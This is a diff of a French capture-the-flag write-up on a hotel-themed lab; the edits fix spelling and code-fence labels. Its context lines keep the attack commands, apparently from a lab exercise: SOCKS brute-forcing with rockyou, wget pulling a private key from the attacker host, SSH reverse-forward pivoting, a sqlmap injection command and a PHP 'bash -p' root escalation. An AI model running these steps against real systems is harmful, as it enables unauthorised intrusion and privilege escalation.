@@ -136,9 +136,9 @@ western
 global
 ```
 
-puis j'ai fournit la fameuse wordlist rockyou pour les mots de passe :  
+puis j'ai fourni la fameuse wordlist rockyou pour les mots de passe :  
 
-```bash
+```console
 $ nmap --script socks-brute --script-args userdb=wordlist.txt,passdb=rockyou.txt -p 1080 192.168.56.9
 
 Nmap scan report for prime.worstwestern.com (192.168.56.9)
@@ -246,11 +246,11 @@ PORT    STATE SERVICE  VERSION
 
 J'ai eu le nez fin (ou plutôt la sale habitude) en regardant le code source de la page et les headers HTTP via cURL :  
 
-```bash
+```console
 $ curl --proxy-user Prime:tinkerbell1 -x socks5://192.168.56.9:1080/ -D- http://192.168.1.124/
 ```
 
-En effet dans le code HTML retourné on peut voir des logs d'authentifications essayées sur la page de login :  
+En effet, dans le code HTML retourné on peut voir des logs d'authentifications essayées sur la page de login :  
 
 ```html
 <tr><td class='success'>Login</td><td>2021-12-09 12:41:22</td> <td>192.168.1.212</td> <td>user</td></tr>
@@ -387,11 +387,11 @@ On va effectuer un remote forwarding du service SSH local qui sera ensuite acces
 
 Première étape, j'ai créé en local un jeu de clés sans passphrase :  
 
-```bash
+```console
 $ ssh-keygen -b 2048 -t rsa -f ctf_key -q -N ""
 ```
 
-Sur le Docker je les rappatrie via Wget au bon emplacement :  
+Sur le Docker je les rapatrie via Wget au bon emplacement :  
 
 ```bash
 wget http://192.168.56.1:8000/ctf_key -O /home/qloapps/.ssh/id_rsa
@@ -403,13 +403,13 @@ J'ajoute aussi cette clé publique dans mon *authorized\_keys* local. L'absence 
 
 Finalement je remote-forwarde le port (sur le Docker) :  
 
-```bash
+```console
 $ ssh -N -o "StrictHostKeyChecking no" -R 2222:localhost:22 devloop@192.168.56.1
 ```
 
 Et depuis ma machine :  
 
-```bash
+```console
 $ ssh -i ctf_key -p 2222 qloapps@127.0.0.1
 
 qloapps@prime:~$ ls
@@ -455,7 +455,7 @@ Success with 192.168.0.100 - {'Date': 'Fri, 10 Dec 2021 12:33:30 GMT', 'Server':
 
 On peut aller plus loin encore avec le forward SSH en mettant en place un proxy SOCKSv4 qui nous permettra d'utiliser Nmap :  
 
-```bash
+```console
 $ ssh -D 127.0.0.1:1080 -p 2222 -N -i ctf_key qloapps@127.0.0.1
 ```
 
@@ -537,7 +537,7 @@ On peut changer la configuration de *Proxy Toggle* dans Firefox pour le faire po
 
 Par défaut (en ne passant que les options de base) SQLmap s'y cassait les dents, il a donc fallut le tenir par la main pour qu'il voit l'exploitation boolean-based :  
 
-```bash
+```console
 $ ./proxychains4 -q -f docker_socks.conf python /tools/sqlmap-dev/sqlmap.py -u 'https://192.168.0.1/forgot-password.php' --data 'email=yolo*&submit=&submit=' --timeout 60 --dbms mysql --level 5 --risk 3 --string 'Your Password'
 ```
 
@@ -622,11 +622,11 @@ Endgame
        valid_lft forever preferred_lft forever
 ```
 
-A voir les interfaces il semble que l'on touche finalement au but !  
+À voir les interfaces il semble que l'on touche finalement au but !  
 
 On trouve aussi un second flag :  
 
-```
+```console
 peterg@hotelww:~$ cat Flag2.txt 
 6ebccebc6644299d554b7854bc22d297eb0d2335
 ```
@@ -667,9 +667,9 @@ system("bash -p");
 ?>
 ```
 
-Ca fonctionne :  
+Ça fonctionne :  
 
-```
+```console
 peterg@hotelww:~$ /usr/bin/php7.3 test.php 
 root@hotelww:~# id
 uid=0(root) gid=1000(peterg) groups=1000(peterg)
@@ -709,7 +709,7 @@ Sous le capot
 
 Les grandes étapes du CTF sont constituées de containers Docker :  
 
-```
+```console
 root@hotelww:/root# docker ps -a
 CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                           NAMES
 27621f70edca        4ndr34z/wwcamera    "/entrypoint supervi…"   7 months ago        Up 29 hours         80/tcp, 443/tcp, 9000/tcp                       camera
@@ -720,7 +720,7 @@ cc12d63f25ef        4ndr34z/wwproxy     "dumb-init sockd"        13 months ago  
 
 On peut étudier le mécanisme de Cross-Site Scripting dans le container *surfer* :  
 
-```
+```console
 root@hotelww:/root# docker exec -it ad38409077c4 /bin/sh
 / # cd /root
 ~ # ls
@@ -784,7 +784,7 @@ On voit l'utilisation d'un browser headless PhantomJS (déprécié mais il suffi
 Comment ça se lance tout ça ? On ne trouvera pas de script d'init des différents containers. En fait chaque container dispose d'une propriété de *RestartPolicy* qui indique comment le service Docker traite chaque container.  
 
 {% raw %}
-```
+```console
 root@hotelww:/etc# docker ps|grep -v CON|awk '{print $1}'|while read line; do  docker inspect -f "{{ .HostConfig.RestartPolicy.Name }}" $line |xargs echo $line ;done
 27621f70edca unless-stopped
 ad38409077c4 unless-stopped
